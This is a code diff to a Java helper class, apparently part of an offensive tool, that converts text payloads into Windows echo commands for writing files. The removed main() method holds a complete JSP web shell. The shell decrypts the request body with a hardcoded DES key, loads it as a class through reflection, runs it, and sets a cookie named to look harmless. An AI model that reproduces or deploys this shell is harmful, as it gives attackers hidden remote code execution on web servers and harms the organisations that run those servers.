@@ -19,34 +19,6 @@ public class WindowsEchoTextConverter implements IHelper {
         return payload;
     }
 
-
-    public static void main(String[] args) throws Exception{
-        String payload = strConverter("<%\n" +
-                "    try {\n" +
-                "        Class.forName(\"UserActionSK\").getMethod(\"invoke\", HttpServletRequest.class, HttpServletResponse.class).invoke(null, request, response);\n" +
-                "    } catch (ClassNotFoundException e) {\n" +
-                "        try {\n" +
-                "            java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class);\n" +
-                "            method.setAccessible(true);\n" +
-                "            java.io.InputStream inputStream = request.getInputStream();\n" +
-                "            java.io.ByteArrayOutputStream byteArrayOutputStream = new java.io.ByteArrayOutputStream();\n" +
-                "            int n = 0;\n" +
-                "            while ((n = inputStream.read()) != -1)\n" +
-                "                byteArrayOutputStream.write(n);\n" +
-                "            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(\"DES\");\n" +
-                "            cipher.init(2, javax.crypto.SecretKeyFactory.getInstance(\"DES\").generateSecret(new javax.crypto.spec.DESKeySpec(\"b50af098\".getBytes())));\n" +
-                "            byte[] ddat = cipher.doFinal(byteArrayOutputStream.toByteArray());\n" +
-                "            method.invoke(Thread.currentThread().getContextClassLoader(), \"UserActionSK\", ddat, 0, ddat.length);\n" +
-                "            response.addCookie(new Cookie(\"X-Ua-Compatible\", java.util.UUID.randomUUID().toString()));\n" +
-                "        } catch (Exception ee) {\n" +
-                "        }\n" +
-                "    }\n" +
-                "    out.clear();\n" +
-                "%>");
-
-        System.out.println(payload);
-    }
-
     @Override
     public String getHelperTabCaption() {
         return "Window Echo To File";
